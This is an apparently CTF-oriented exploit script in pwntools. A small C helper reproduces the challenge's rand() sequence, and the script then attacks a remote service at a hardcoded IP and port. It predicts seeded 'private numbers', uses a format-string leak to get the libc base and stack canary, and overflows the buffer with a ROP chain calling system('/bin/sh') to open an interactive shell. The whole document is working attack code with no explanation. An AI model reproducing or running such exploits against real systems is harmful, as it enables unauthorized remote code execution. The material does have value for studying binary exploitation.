

'''
// random generatior
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(void)
{
	int c = 0;
	puts("Enter seed:");
	scanf("%d", &c);
	int i = 0;
	srand(c);
	for (i = 0; i< 16; ++i)
		printf("%d ", rand());

	return 0;
}
'''



from pwn import *

#p = process('./pwn2')
#e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('203.162.91.5', 6967)
e = ELF('./libc.so.6')

pop_rdi_ret_off = 0x000000000002155f
ret_off = 0x00000000000008aa

#pop_rdi_ret_off = 0x00000000000267de
#ret_off = 0x000000000002537f

libc_start_off = e.symbols['__libc_start_main']
system = e.symbols['system']
binsh = e.search('/bin/sh').next()

time = p.recvuntil(']')
time = time[1:-1]
times = time.split(':')
seed = int(times[0], 10) * (int(times[1], 10)/15 + 1)


p2 = process('./random_gen')
p2.sendline(str(seed))
p2.recvuntil('Enter seed:')
p2.recvline()
d = p2.recv().strip().split(' ')
p2.close()

for i in range (0, 16):
	p.recvuntil('private number: ')
	p.sendline(d[i])


p.recvuntil('help you ?')
p.recvline()
p.sendline('%21$p.%19$p')
#p.sendline('%p.%p.'*20)
#print p.recv()
data = p.recvline().strip().split('.')
log.info(data)
libc_start = int(data[0], 16)
canary = int(data[1], 16)
libc = libc_start - libc_start_off - 231
binsh += libc
system += libc

print 'cana: ' + hex(canary)
print 'libc: ' + hex(libc)
print 'bins: ' + hex(binsh)

pop_rdi_ret = libc + pop_rdi_ret_off
ret = libc + ret_off
ex = 88*'A' + p64(canary) + 8*'A' + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.recvuntil('? ')

p.sendline(ex)

p.interactive()
